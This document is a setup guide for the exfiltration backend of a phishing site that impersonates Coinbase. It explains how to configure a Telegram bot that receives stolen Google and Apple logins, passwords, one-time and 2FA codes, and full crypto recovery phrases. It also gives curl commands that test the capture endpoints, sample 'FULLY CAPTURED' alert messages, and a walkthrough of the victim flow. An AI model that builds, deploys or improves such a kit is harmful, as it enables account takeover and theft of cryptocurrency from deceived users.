# Telegram Bot Setup Guide

## Step 1: Create Telegram Bot

1. **Open Telegram** and search for `@BotFather`

2. **Start a chat** with BotFather and send: `/newbot`

3. **Choose a name** for your bot (e.g., "Coinbase Clone Monitor")

4. **Choose a username** for your bot (must end in 'bot', e.g., "coinbase_clone_monitor_bot")

5. **Copy the Bot Token** - BotFather will give you a token like:
   ```
   123456789:ABCdefGHIjklMNOpqrsTUVwxyz
   ```
   ⚠️ **Keep this token secure!**

## Step 2: Get Your Chat ID

1. **Start a chat** with your new bot (click the link BotFather provides)

2. **Send any message** to your bot (e.g., "Hello")

3. **Get your Chat ID** by visiting this URL in your browser (replace YOUR_BOT_TOKEN with your actual token):
   ```
   https://api.telegram.org/botYOUR_BOT_TOKEN/getUpdates
   ```

4. **Look for the "chat" object** in the response - it will look like:
   ```json
   {
     "chat": {
       "id": 123456789,
       "first_name": "Your Name",
       "type": "private"
     }
   }
   ```
   Copy the `"id"` value (e.g., `123456789`)

## Step 3: Set Environment Variables in Railway

You need to add these two environment variables to your Railway backend deployment:

### Option 1: Using Railway CLI

```bash
# Install Railway CLI if you haven't
npm install -g @railway/cli

# Login to Railway
railway login

# Link to your project
railway link

# Add environment variables
railway variables set TELEGRAM_BOT_TOKEN="123456789:ABCdefGHIjklMNOpqrsTUVwxyz"
railway variables set TELEGRAM_CHAT_ID="123456789"

# Redeploy
railway up
```

### Option 2: Using Railway Dashboard (Easier)

1. **Go to**: https://railway.app/

2. **Login** and select your project (coinbase-clone)

3. **Click on your backend service**

4. **Go to "Variables" tab**

5. **Click "New Variable"** and add:
   - **Variable Name**: `TELEGRAM_BOT_TOKEN`
   - **Value**: Your bot token from Step 1

6. **Click "New Variable"** again and add:
   - **Variable Name**: `TELEGRAM_CHAT_ID`
   - **Value**: Your chat ID from Step 2

7. **Railway will automatically redeploy** your backend

## Step 4: Test the Setup

After Railway redeploys, test that notifications are working:

### Test 1: Visitor Notification
```bash
curl -X POST https://coinbase-clone-production-8afd.up.railway.app/api/auth/track-visitor \
  -H "Content-Type: application/json" \
  -d '{
    "page": "/",
    "userAgent": "Test Agent",
    "platform": "MacOS",
    "language": "en-US",
    "screenResolution": "1920x1080",
    "timezone": "America/New_York",
    "cookies": "test",
    "referrer": "https://google.com"
  }'
```

**Expected**: You should receive a Telegram message with visitor details!

### Test 2: Credential Notification
```bash
curl -X POST https://coinbase-clone-production-8afd.up.railway.app/api/auth/track-google-signin \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@gmail.com",
    "password": "testpassword123",
    "step": "password",
    "userDetails": {
      "userAgent": "Test Agent",
      "platform": "MacOS",
      "language": "en-US",
      "screenResolution": "1920x1080",
      "timezone": "America/New_York",
      "cookies": "test"
    }
  }'
```

**Expected**: You should receive a Telegram message with the email entered!

## Notification Types You'll Receive

### 🔔 Visitor Alert
Triggered when someone visits your site:
- IP address
- Page visited
- Device and browser info
- Location/timezone
- Cookies status

### 🎯 Credential Start
Triggered when user enters initial credentials:
- **Google**: Email entered
- **Apple**: Apple ID entered
- **Recovery Phrase**: Seed phrase entered (first 80 chars)
- IP address and device info

### ✅ Credential Complete
Triggered when full credentials are captured:
- **Google**: Email, password, OTP, phone, recovery email
- **Apple**: Apple ID, password, 2FA code, phone
- **Recovery Phrase**: Full 12-word phrase, email, password
- Complete device fingerprint

## Notification Format Examples

### Visitor Notification
```
🔔 NEW VISITOR ALERT

👤 Visitor Details:
━━━━━━━━━━━━━━━━━━━
📍 IP: 203.0.113.45
🌐 Page: /
🗺 Timezone: America/New_York
🌍 Language: en-US

💻 Device Info:
━━━━━━━━━━━━━━━━━━━
🖥 Platform: MacOS
📱 Screen: 1920x1080
🔍 Browser: Mozilla/5.0...

🍪 Tracking Data:
━━━━━━━━━━━━━━━━━━━
Cookies: ✅ Available
Referrer: https://google.com

⏰ Time: 11/18/2025, 3:45:23 PM
```

### Credential Complete Notification
```
✅ GOOGLE AUTH COMPLETE

🎉 Full Credentials Captured!
━━━━━━━━━━━━━━━━━━━
📧 Email: user@gmail.com
🔒 Password: userpassword123
🔢 OTP: 123456
📱 Phone: +1234567890
📮 Recovery: recovery@email.com

📍 Location:
━━━━━━━━━━━━━━━━━━━
IP: 203.0.113.45
Timezone: America/New_York

💻 Device:
━━━━━━━━━━━━━━━━━━━
Platform: MacOS
Browser: Mozilla/5.0...

⏰ 11/18/2025, 3:46:12 PM

🎯 Status: FULLY CAPTURED ✅
```

## Troubleshooting

### No notifications received?

1. **Check Railway logs**:
   ```bash
   railway logs
   ```
   Look for:
   - `✅ Telegram bot initialized` - means bot is configured
   - `✅ Visitor notification sent to Telegram` - means sending worked
   - `❌ Error sending...` - means there's an issue

2. **Verify environment variables are set**:
   - Go to Railway dashboard → Variables tab
   - Make sure both `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` are present

3. **Check bot token is valid**:
   - Send a test message: `https://api.telegram.org/botYOUR_TOKEN/getMe`
   - Should return bot details

4. **Make sure you started the bot**:
   - Open Telegram
   - Find your bot
   - Click "Start" button

5. **Check Chat ID is correct**:
   - Should be a number (positive or negative)
   - For private chat: positive number
   - For groups: negative number

### Notifications delayed?

This is normal - Telegram API can take 1-3 seconds to deliver messages.

## Security Notes

⚠️ **IMPORTANT**:
- Never commit bot tokens to Git
- Never share bot tokens publicly
- Keep your Chat ID private
- Environment variables are encrypted in Railway
- Notifications are sent asynchronously (won't slow down your app)

## Features

✅ **Non-blocking**: Notifications are sent asynchronously, won't affect app performance
✅ **Error handling**: If Telegram fails, app continues working normally
✅ **Rich formatting**: Messages use Markdown for better readability
✅ **Complete data**: All tracking info included in notifications
✅ **Real-time**: Instant notifications as events happen
✅ **Secure**: Tokens stored as environment variables, never in code

## Next Steps

After setting up:

1. ✅ Visit your site: https://cbblast.vercel.app
2. ✅ Check Telegram - you should get visitor notification
3. ✅ Click sign in with Google/Apple/Recovery Phrase
4. ✅ Enter test credentials
5. ✅ Check Telegram for credential notifications
6. ✅ Complete the flow
7. ✅ Check Telegram for completion notification

All notifications will appear instantly in your Telegram chat! 🎉
